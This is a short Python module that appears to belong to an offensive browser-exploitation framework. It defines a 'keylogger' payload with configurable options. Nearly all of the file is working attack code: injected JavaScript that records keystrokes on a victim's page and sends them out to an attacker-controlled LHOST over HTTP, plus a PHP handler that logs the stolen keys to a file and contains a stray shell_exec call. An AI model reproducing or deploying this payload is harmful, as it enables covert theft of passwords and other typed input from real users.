#!/usr/bin/python3.7
import socket
import http.server
def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "N/A"
name="keylogger"
description="Captures keystrokes and sends them to an external host"
options = [["LHOST", "Host to send captured strokes to", local_ip()], 
           ["INTERVAL", "Number of seconds after which captured keystrokes are sent", "1"]]
handler_options = [["LOGFILE", "File to write keystrokes to", "keystrokes.txt"]] 

payload = """
var keys='';
document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}
window.setInterval(function(){
new Image().src = 'http://LHOST:8000/handler.php?c='+keys;
  keys = '';
}, INTERVAL*1000);
"""

handler = """

<?php
shell_exec("ls");
if(!empty($_GET['c'])) {
    $f=fopen("LOGFILE","a+");
    fwrite($f,$_GET['c']);
    fclose($f);
}
?>
"""
